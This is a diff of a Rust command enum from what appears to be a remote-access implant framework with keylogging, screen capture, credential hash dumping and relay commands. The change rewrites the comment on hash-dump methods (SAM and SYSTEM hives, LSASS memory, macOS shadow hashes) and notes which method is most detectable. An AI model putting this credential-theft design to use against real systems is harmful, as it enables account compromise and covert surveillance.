@@ -137,7 +137,13 @@ pub enum Command {
     Keylog { action: u8 },
     /// 持续截屏（定时截图，`interval_secs` 秒一张）。
     Screenwatch { interval_secs: u32 },
-    /// 凭据哈希提取。`method` 0=SAM(LSASS), 1=hashdump(macOS shadow hash)。
+    /// 凭据哈希提取。`method` 语义（跨后端统一约定）：
+    ///   - 0 = SAM hive（Windows，加密，需配 SYSTEM hive 离线解 NTLM）
+    ///   - 1 = SYSTEM hive（Windows，boot-key 源）
+    ///   - 2 = LSASS 内存 dump（预留；最响的 IOC，所有后端暂返回 deferred）
+    ///   - 3 = macOS shadow hash（agent-dev，读 dslocal plist）
+    /// 数字 0/1 在 implant-win 上行为不变（旧 beacon 兼容）；agent-dev 的
+    /// method=1 从 shadow 改为 SYSTEM（macOS 返回 unsupported），shadow 挪到 3。
     Hashdump { method: u8 },
     /// Write `data` to an open relay channel's socket — the operator→implant
     /// direction of the SOCKS / rportfwd relay. `chan` is the id a prior
